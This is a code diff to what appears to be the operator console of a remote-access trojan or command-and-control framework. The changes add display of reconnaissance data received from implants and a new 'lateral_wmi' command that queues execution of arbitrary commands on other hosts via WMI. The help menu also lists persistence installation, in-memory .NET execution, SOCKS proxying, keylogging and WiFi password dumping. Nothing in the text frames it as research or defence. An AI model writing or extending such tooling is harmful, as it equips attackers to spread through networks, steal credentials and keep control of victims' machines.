@@ -942,13 +942,23 @@ def beacon():
                     data = base64.b64decode(full_b64)
                     # Handle based on tag (save file, etc.)
                     print(f"[✓] Reassembled {pending_chunks[base_id]['tag']} ({len(data)/1024/1024:.1f} MB)")
+                    if pending_chunks[base_id]['tag'] == 'DEEP_RECON':
+                        try:
+                            recon_data = json.loads(data.decode('utf-8', errors='ignore'))
+                            print(json.dumps(recon_data, indent=4))
+                        except json.JSONDecodeError:
+                            print("[-] Failed to decode deep_recon JSON")
                     del pending_chunks[base_id]
 
             else:
                 if output:
-                    print(f"[✓] Task {task_id[:8]}... output:")
-                    for line in output.strip().splitlines()[:30]:
-                        print(f" {line}")
+                    try:
+                        recon_data = json.loads(output)
+                        print(json.dumps(recon_data, indent=4))
+                    except json.JSONDecodeError:
+                        print(f"[✓] Task {task_id[:8]}... output:")
+                        for line in output.strip().splitlines()[:30]:
+                            print(f" {line}")
                 if error:
                     print(f" [!] Error: {error}")
         # Fetch and clear pending tasks
@@ -1005,6 +1015,7 @@ def cli():
             ("socks stop", "Stop SOCKS5 proxy"),
             ("persistence wmi|com", "Install advanced persistence"),
             ("execute <path> [args]", "Execute .NET assembly in-memory"),
+            ("lateral_wmi <target> <cmd>", "Execute command on remote host via WMI"),
             ("wifi_dump", "Dump saved WiFi passwords"),
             ("wifi_scan", "Scan for nearby networks"),
             ("clear", "Clear console"),
@@ -1217,6 +1228,15 @@ def cli():
                 else:
                     add_task(current, "keylog", parts[1].lower())
                     print(f"[>] Keylog {parts[1]} queued")
+
+            elif action == "lateral_wmi":
+                if len(parts) < 3:
+                    print("[-] Usage: lateral_wmi <target> <command>")
+                else:
+                    target = parts[1]
+                    cmd = " ".join(parts[2:])
+                    add_task(current, "lateral_wmi", f"{target}:{cmd}")
+                    print(f"[>] Queued lateral_wmi for {target} with command: {cmd}")
 
             else:
                 print(f"[-] Unknown command: {action}. Type 'help' for options.")
